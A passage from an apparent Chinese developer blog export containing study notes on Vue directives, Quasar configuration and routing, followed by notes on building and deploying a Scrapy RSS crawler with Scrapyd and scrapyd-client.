class="hljs-name">label</span>&gt;</span>Username<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;Enter your username&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">template</span> <span class="hljs-attr">v-else</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">label</span>&gt;</span>Email<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;Enter your email address&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这里添加一个切换两个template会导致这两个input的值一样举个例子</p><p><img src="/.com//Users\lll\AppData\Roaming\Typora\typora-user-images\image-20210508094253766.png" alt="image-20210508094253766"></p><p>这里输入aaaa单击按钮后</p><p><img src="/.com//Users\lll\AppData\Roaming\Typora\typora-user-images\image-20210508094318424.png" alt="image-20210508094318424"></p><p>可以看出切换了但是里面值没变如果要解决这个问题就需要给元素一个keyid</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">&quot;loginType === &#x27;username&#x27;&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">label</span>&gt;</span>Username<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;Enter your username&quot;</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&quot;username-input&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">template</span> <span class="hljs-attr">v-else</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">label</span>&gt;</span>Email<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;Enter your email address&quot;</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&quot;email-input&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这样以后每次切换都会重新渲染</p><blockquote><p>v-if和v-for建议不要再一个标签内用，v-for的优先级比较高</p></blockquote><h3 id="v-show"><a href="#v-show" class="headerlink" title="v-show"></a>v-show</h3><p>和v-if用法一样但是不同的是无法使用template、v-else和v-else-if</p><p>if和show的区别：</p><p><code>v-if</code> 是“真正”的条件渲染，因为它会确保在切换过程中条件块内的事件监听器和子组件适当地被销毁和重建。</p><p><code>v-if</code> 也是<strong>惰性的</strong>：如果在初始渲染时条件为假，则什么也不做——直到条件第一次变为真时，才会开始渲染条件块。</p><p>相比之下，<code>v-show</code> 就简单得多——不管初始条件是什么，元素总是会被渲染，并且只是简单地基于 CSS 进行切换。</p><p>一般来说，<code>v-if</code> 有更高的切换开销，而 <code>v-show</code> 有更高的初始渲染开销。因此，如果需要非常频繁地切换，则使用 <code>v-show</code> 较好；如果在运行时条件很少改变，则使用 <code>v-if</code> 较好。</p><h3 id="v-for"><a href="#v-for" class="headerlink" title="v-for"></a>v-for</h3><p>for遍历列表item表示元素,index代表下标(从前往后)</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;example-2&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">&quot;(item, index) in items&quot;</span>&gt;</span><br>    &#123;&#123; parentMessage &#125;&#125; - &#123;&#123; index &#125;&#125; - &#123;&#123; item.message &#125;&#125;<br>  <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs json">var example2 = new Vue(<span class="hljs-punctuation">&#123;</span><br>  el<span class="hljs-punctuation">:</span> &#x27;#example<span class="hljs-number">-2</span>&#x27;<span class="hljs-punctuation">,</span><br>  data<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    parentMessage<span class="hljs-punctuation">:</span> &#x27;Parent&#x27;<span class="hljs-punctuation">,</span><br>    items<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>      <span class="hljs-punctuation">&#123;</span> message<span class="hljs-punctuation">:</span> &#x27;Foo&#x27; <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-punctuation">&#123;</span> message<span class="hljs-punctuation">:</span> &#x27;Bar&#x27; <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span>)<br></code></pre></td></tr></table></figure><p>for遍历对象value代表每个键所对的值,name代表每个键,index代表下标</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">&quot;(value, name, index) in object&quot;</span>&gt;</span><br>  &#123;&#123; index &#125;&#125;. &#123;&#123; name &#125;&#125;: &#123;&#123; value &#125;&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>在遍历数据时由于采用Object.keys()所以每次遍历结果不一定一样</p><p>当 Vue 正在更新使用 <code>v-for</code> 渲染的元素列表时，它默认使用“就地更新”的策略。如果数据项的顺序被改变，Vue 将不会移动 DOM 元素来匹配数据项的顺序，而是就地更新每个元素，并且确保它们在每个索引位置正确渲染。</p><p>为了给 Vue 一个提示，以便它能跟踪每个节点的身份，从而重用和重新排序现有元素，你需要为每项提供一个唯一 <code>key</code> attribute：</p><p>不要使用对象或数组之类的非基本类型值作为 <code>v-for</code> 的 <code>key</code>。请用字符串或数值类型的值。</p></blockquote><h3 id="v-model"><a href="#v-model" class="headerlink" title="v-model"></a>v-model</h3><blockquote><p>【只能用在html表单控件上（还有自定义组件），其他组件无效】</p></blockquote><ul><li><p><strong>限制</strong>：</p></li><li><ul><li><code>&lt;input&gt;</code></li><li><code>&lt;select&gt;</code></li><li><code>&lt;textarea&gt;</code></li><li>components</li></ul></li></ul><h3 id="自定义指令"><a href="#自定义指令" class="headerlink" title="自定义指令"></a>自定义指令</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 注册一个全局自定义指令 v-focus</span><br><span class="hljs-title class_">Vue</span>.<span class="hljs-title function_">directive</span>(<span class="hljs-string">&#x27;focus&#x27;</span>, &#123;<br>  <span class="hljs-comment">// 当绑定元素插入到 DOM 中。</span><br>  <span class="hljs-attr">inserted</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">el</span>) &#123;<br>    <span class="hljs-comment">// 聚焦元素</span><br>    el.<span class="hljs-title function_">focus</span>()<br>  &#125;<br>&#125;)<br></code></pre></td></tr></table></figure><p>使用Vue.directive进行指令注册第一个参数为指令名称(“默认前面添加v-“)</p><p>inserted是一个<a href="##%E9%92%A9%E5%AD%90">钩子函数</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;<br>  <span class="hljs-attr">el</span>: <span class="hljs-string">&#x27;#app&#x27;</span>,<br>  <span class="hljs-attr">directives</span>: &#123;<br>    <span class="hljs-comment">// 注册一个局部的自定义指令 v-focus</span><br>    <span class="hljs-attr">focus</span>: &#123;<br>      <span class="hljs-comment">// 指令的定义</span><br>      <span class="hljs-attr">inserted</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">el</span>) &#123;<br>        <span class="hljs-comment">// 聚焦元素</span><br>        el.<span class="hljs-title function_">focus</span>()<br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;)<br></code></pre></td></tr></table></figure><p>或者使用上面的方法进行局部的注册指令</p><h2 id="关于Quasar"><a href="#关于Quasar" class="headerlink" title="关于Quasar"></a>关于Quasar</h2><h4 id="跨域"><a href="#跨域" class="headerlink" title="跨域"></a>跨域</h4><p>他和别的vue不同需要的所有配置要在quasar.config.js中修改</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs json">devServer<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>  proxy<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    &#x27;/api&#x27;<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      target<span class="hljs-punctuation">:</span> &#x27;http<span class="hljs-punctuation">:</span><span class="hljs-comment">//localhost:8001&#x27;,//代理服务器</span><br>      pathRewrite<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span> &#x27;^/api&#x27;<span class="hljs-punctuation">:</span> &#x27;&#x27; <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-comment">//将以/api开头的所有替换为空</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>  https<span class="hljs-punctuation">:</span> <span class="hljs-keyword">false</span><span class="hljs-punctuation">,</span><br>  port<span class="hljs-punctuation">:</span> <span class="hljs-number">8080</span><span class="hljs-punctuation">,</span><br>  open<span class="hljs-punctuation">:</span> <span class="hljs-keyword">true</span> <span class="hljs-comment">// opens browser window automatically</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br></code></pre></td></tr></table></figure><h4 id="图标的导入"><a href="#图标的导入" class="headerlink" title="图标的导入"></a>图标的导入</h4><p>****步骤一****，目前Quasar支持：<a href="https://material.io/icons/">Material Icons</a> 、<a href="http://fontawesome.io/icons/">Font Awesome</a>、<a href="http://ionicons.com/">Ionicons</a>、<a href="https://materialdesignicons.com/">MDI</a> and <a href="https://icomoon.io/">IcoMoon</a>。</p><p><strong>步骤二</strong>，在quasar.conf.js里 ctrl+f，找到extras</p><p><img src="/.com//Users\lll\AppData\Roaming\Typora\typora-user-images\image-20210731125916822.png" alt="image-20210731125916822"></p><p><em><strong>*步骤三*</strong></em></p><p><img src="/.com//Users\lll\AppData\Roaming\Typora\typora-user-images\image-20210731125835589.png" alt="image-20210731125835589"></p><p><a href="http://www.quasarchs.com/vue-components/icon#%E8%87%AA%E5%AE%9A%E4%B9%89%E6%98%A0%E5%B0%84%E5%AE%98%E7%BD%91%E5%9C%B0%E5%9D%80">http://www.quasarchs.com/vue-components/icon#%E8%87%AA%E5%AE%9A%E4%B9%89%E6%98%A0%E5%B0%84官网地址</a></p><h2 id="报错解决"><a href="#报错解决" class="headerlink" title="报错解决"></a>报错解决</h2><p><a href="https://blog.csdn.net/chenmoupeng/article/details/107317247">https://blog.csdn.net/chenmoupeng/article/details/107317247</a></p><p><img src="/.com//Users\lll\AppData\Roaming\Typora\typora-user-images\image-20210514105242812.png" alt="image-20210514105242812"></p><p>看到这个傻逼错误了吗</p><p>哪个网址就是解决它的如果不行就把它<img src="/.com//Users\lll\AppData\Roaming\Typora\typora-user-images\image-20210514105330500.png" alt="image-20210514105330500">打开</p><h2 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h2><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">this</span>.$router<br></code></pre></td></tr></table></figure><p>使用router对象几乎可以完成所有有关url</p><p><a href="https://router.vuejs.org/zh/%E5%AE%98%E7%BD%91%E6%96%87%E6%A1%A3">https://router.vuejs.org/zh/官网文档</a></p><p><a href="https://www.jianshu.com/p/fa0b5d919615%E5%85%B6%E4%BB%96%E8%AE%B2%E8%A7%A3">https://www.jianshu.com/p/fa0b5d919615其他讲解</a></p>]]></content>
    
    
    <categories>
      
      <category>前端</category>
      
    </categories>
    
    
    <tags>
      
      <tag>前端</tag>
      
      <tag>Vue</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>虫术</title>
    <link href="/2022/01/10/%E8%99%AB%E6%9C%AF/"/>
    <url>/2022/01/10/%E8%99%AB%E6%9C%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="虫术"><a href="#虫术" class="headerlink" title="虫术"></a>虫术</h1><p>pip config set global.index-url <a href="https://pypi.tuna.tsinghua.edu.cn/simple/%E5%B0%86pip%E6%BA%90%E6%94%B9%E4%B8%BA%E6%B8%85%E5%8D%8E%E5%A4%A7%E5%AD%A6%E7%9A%84%E9%95%9C%E5%83%8F">https://pypi.tuna.tsinghua.edu.cn/simple/将pip源改为清华大学的镜像</a></p><h2 id="开启scrapy项目之旅"><a href="#开启scrapy项目之旅" class="headerlink" title="开启scrapy项目之旅"></a>开启scrapy项目之旅</h2><ul><li><p>pip install scrapy#安装scrapy框架</p></li><li><p>可以用codecs.open()来替代原生open</p></li><li><p>用UnicodeDammit(“字符串”,[编码类型(列表)])</p></li><li><p>创建一个项目</p></li><li><p>scrapy startproject [项目名]</p></li><li><p>创建一个scrapy</p></li><li><p>scrapy genspider 项目名 网站名如 scrapy genspider example example.com</p></li><li><p>抓取一个scrapy项目</p></li><li><p>scrapy crawl 项目名</p></li><li><h5 id="创建Item"><a href="#创建Item" class="headerlink" title="创建Item"></a>创建Item</h5></li><li><p>管理字典一样管理</p></li></ul><h4 id="间接爬虫"><a href="#间接爬虫" class="headerlink" title="间接爬虫"></a>间接爬虫</h4><ul><li><p>导入一个请求链接的包</p></li><li><p>from scrapy.http import Request</p></li><li><p>然后用Request(url &#x3D; ‘’,callback&#x3D;[函数名])来返回</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse</span>(<span class="hljs-params">self, response</span>):<br>    rss_page = BeautifulSoup(response.body,<span class="hljs-string">&quot;html.parser&quot;</span>)<br>    rss_link = <span class="hljs-built_in">set</span>([item[<span class="hljs-string">&#x27;href&#x27;</span>] <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> rss_page.find_all(<span class="hljs-string">&#x27;a&#x27;</span>)])<br>    <span class="hljs-keyword">for</span> link <span class="hljs-keyword">in</span> rss_link:<br>        <span class="hljs-keyword">yield</span> Request(url=link,callback=self.parse_feed)<br></code></pre></td></tr></table></figure><ul><li>然后在parse_feed里面继续处理请求的链接</li></ul><h3 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h3><ul><li><p>经过parse函数的爬取返回后就到了管道,进行对数据进行处理</p></li><li><p>通过查看配置文件</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#用来设定开启的管道接口采取完整的名称,:后面的是优先级,数值越低优先级越高还可以在pipelines里面添加其他的管道</span><br>ITEM_PIPELINES = &#123;<br>   <span class="hljs-string">&#x27;chinanews_cawler.pipelines.ChinanewsCawlerPipeline&#x27;</span>: <span class="hljs-number">300</span>,<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Scrapy的运行和配置"><a href="#Scrapy的运行和配置" class="headerlink" title="Scrapy的运行和配置"></a>Scrapy的运行和配置</h2><ul><li>对scrapy的设定优先级</li></ul><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">最高:命令行</span><br><span class="hljs-section">其次:模块设定例如myproject.settings</span><br><span class="hljs-section">第三:命令模块设定全局默认设定存储在scrapy.settings.default_settings模块中</span><br><span class="hljs-section">最低:全局默认设定</span><br></code></pre></td></tr></table></figure><h5 id="测试案例"><a href="#测试案例" class="headerlink" title="测试案例"></a>测试案例</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#####</span><br><span class="hljs-comment">#__init__.py文件用来写spider</span><br><span class="hljs-comment">#####</span><br><br><br><span class="hljs-comment"># This package will contain the spiders of your Scrapy project</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Please refer to the documentation for information on how to create and manage</span><br><span class="hljs-comment"># your spiders.</span><br><span class="hljs-keyword">from</span> scrapy.spiders <span class="hljs-keyword">import</span> Spider<br><span class="hljs-keyword">from</span> scrapy.http <span class="hljs-keyword">import</span> Request<br><span class="hljs-keyword">from</span> ..items <span class="hljs-keyword">import</span> myItem<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ChinaNewsSpider</span>(<span class="hljs-title class_ inherited__">Spider</span>):<br>    name = <span class="hljs-string">&quot;chinanews&quot;</span><br>    allowed_domains = [<span class="hljs-string">&#x27;chinanews.com&#x27;</span>]<br>    start_urls = (<span class="hljs-string">&#x27;http://www.chinanews.com/rss/rss_2.html&#x27;</span>,)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">parse</span>(<span class="hljs-params">self, response</span>):<br>        rss_page = BeautifulSoup(response.body,<span class="hljs-string">&quot;html.parser&quot;</span>)<br>        rss_link = <span class="hljs-built_in">set</span>([item[<span class="hljs-string">&#x27;href&#x27;</span>] <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> rss_page.find_all(<span class="hljs-string">&#x27;a&#x27;</span>)])<br>        <span class="hljs-keyword">for</span> link <span class="hljs-keyword">in</span> rss_link:<br>            <span class="hljs-keyword">yield</span> Request(url=link,callback=self.parse_feed)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_feed</span>(<span class="hljs-params">self,response</span>):<br>        rss = BeautifulSoup(response.body,<span class="hljs-string">&#x27;lxml&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(rss)<br>        <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> rss.find_all(<span class="hljs-string">&#x27;item&#x27;</span>):<br>            feedField = myItem()<br>            feedField[<span class="hljs-string">&#x27;title&#x27;</span>] = item.title.text<br>            feedField[<span class="hljs-string">&#x27;link&#x27;</span>] = item.link.text<br>            feedField[<span class="hljs-string">&#x27;desc&#x27;</span>] = item.description.text<br>            feedField[<span class="hljs-string">&#x27;pub_date&#x27;</span>] = item.pubdate.text<br>            <span class="hljs-keyword">yield</span> feedField<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#######</span><br><span class="hljs-comment">#items.py用来写传递数据的items类</span><br><span class="hljs-comment">#######</span><br><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><br><span class="hljs-comment"># Define here the models for your scraped items</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># See documentation in:</span><br><span class="hljs-comment"># https://doc.scrapy.org/en/latest/topics/items.html</span><br><br><span class="hljs-keyword">import</span> scrapy<br><span class="hljs-keyword">from</span> scrapy.item <span class="hljs-keyword">import</span> Item,Field<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">myItem</span>(<span class="hljs-title class_ inherited__">Item</span>):<br>    title = Field()<span class="hljs-comment">#标题</span><br>    link = Field()<span class="hljs-comment">#新闻详情</span><br>    desc = Field()<span class="hljs-comment">#新闻综述</span><br>    pub_date = Field()<span class="hljs-comment">#发布日期</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ChinanewsCawlerItem</span>(scrapy.Item):<br>    <span class="hljs-comment"># define the fields for your item here like:</span><br>    <span class="hljs-comment"># name = scrapy.Field()</span><br>    <span class="hljs-keyword">pass</span><br><br></code></pre></td></tr></table></figure><h4 id="对于Scrapy工程管理的命令"><a href="#对于Scrapy工程管理的命令" class="headerlink" title="对于Scrapy工程管理的命令"></a>对于Scrapy工程管理的命令</h4><ul><li><p>对于开发与测试环境都要基于Scrapy</p></li><li><p>开发环境中以scrapy-client作为自动化部署工具</p></li><li><p>生产环境中将以Scrapyd工具为宿主</p></li></ul><h5 id="Scrapyd可以采用RESTful-API来对服务进行检查"><a href="#Scrapyd可以采用RESTful-API来对服务进行检查" class="headerlink" title="Scrapyd可以采用RESTful API来对服务进行检查"></a>Scrapyd可以采用RESTful API来对服务进行检查</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//默认服务地址为http://localhost:6800</span><br>一、采用GET请求<br>    <span class="hljs-number">1.</span>查询API:<br>        http:<span class="hljs-comment">//localhost:6800/daemonstatus.json</span><br>    结果:<br>        &#123;<span class="hljs-string">&quot;node_name&quot;</span>: <span class="hljs-string">&quot;DESKTOP-8D37QB2&quot;</span>, <span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-string">&quot;ok&quot;</span>, <span class="hljs-string">&quot;pending&quot;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&quot;running&quot;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&quot;finished&quot;</span>: <span class="hljs-number">0</span>&#125;<br><br>    <span class="hljs-number">2.</span>获取已上传的列表<br>        http:<span class="hljs-comment">//localhost:6800/listproject.json</span><br><br><span class="hljs-number">3.</span>查询可用版本列表<br>        http:<span class="hljs-comment">//localhost:6800/listversions.json?project = 项目名</span><br><br><span class="hljs-number">4.</span>获取当前版本可用的spider<br>        http:<span class="hljs-comment">//localhost:6800/listspiders.json?project = 项目名[&amp;_version=版本号]</span><br>        <br>    <span class="hljs-number">5.</span>获取项目中待定的、正在运行的、已完成的列表<br>        http:<span class="hljs-comment">//localhost:6800/listjobs.json?project = 项目名</span><br><br>二、采用POST请求<br>   <span class="hljs-number">1.</span>删除项目<br>    http:<span class="hljs-comment">//localhost:6800/delproject.json -d project = 项目名</span><br><br><span class="hljs-number">2.</span>添加一个项目版本<br>        http:<span class="hljs-comment">//localhost:6800/addversion.json -F project=项目名 -F version=r23 -F egg=@myproject.egg</span><br><br>    <span class="hljs-number">3.</span>加载运行指定的蜘蛛<br>http:<span class="hljs-comment">//localhost:6800/schedule.json -d project=项目名 -d spider=蜘蛛名 -d [setting=声明的设置项目] [-d jobid=工作id用来取代默认的id] [-d _version=版本号]</span><br><br>    <span class="hljs-number">4.</span>中制蜘蛛的作业<br>        http:<span class="hljs-comment">//localhost:6800/cancel.json -d project=项目名 -d job=作业编号</span><br><br>    <span class="hljs-number">5.</span>删除已经上传的版本<br>http:<span class="hljs-comment">//localhost:6800/delversion.json -d project=项目名 -d version=r23</span><br></code></pre></td></tr></table></figure><h5 id="使用scrapyd-client"><a href="#使用scrapyd-client" class="headerlink" title="使用scrapyd-client"></a>使用scrapyd-client</h5><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs axapta">一、展示项目或者爬虫<br>    scrapyd-<span class="hljs-keyword">client</span> project<br>    列出服务器上所有的项目<br><br>    scrapyd-<span class="hljs-keyword">client</span> -t http:<span class="hljs-comment">//scrapyd.example.net project</span><br>    列出指定服务器地址上的项目<br><br>scrapyd-<span class="hljs-keyword">client</span> spiders<br>列出所有的spider<br><br>scrapyd-<span class="hljs-keyword">client</span> spiders -p sina<br>列出指定项目(sina)下的spider<br><br>二、启动一个或者多个爬网任务<br>scrapyd-<span class="hljs-keyword">client</span> schedule<br>启动任意爬虫<br><br>scrapyd-<span class="hljs-keyword">client</span> schedule -p sina *<br>启动指定项目(sina)中的所有爬虫<br><br>scrapyd-<span class="hljs-keyword">client</span> schedule -p *<br>支持通配符,启动所有以_daily结尾的项目中的蜘蛛<br><br><br></code></pre></td></tr></table></figure><h2 id="scrapyd-deploy"><a href="#scrapyd-deploy" class="headerlink" title="scrapyd-deploy"></a>scrapyd-deploy</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs cmd">#命令使用<br> -h, --<span class="hljs-built_in">help</span>            show this <span class="hljs-built_in">help</span> message and <span class="hljs-keyword">exit</span><br> -p PROJECT, --project=PROJECT<br>                       the project name <span class="hljs-keyword">in</span> the target<br> -v VERSION, --version=VERSION<br>                       the version to deploy. Defaults to current timestamp<br> -l, --list-targets    list available targets<br> -a, --deploy-all-targets<br>                       deploy all targets<br> -d, --debug           debug <span class="hljs-built_in">mode</span> (<span class="hljs-keyword">do</span> <span class="hljs-keyword">not</span> remove build <span class="hljs-built_in">dir</span>)<br> -L TARGET, --list-projects=TARGET<br>                       list available projects on 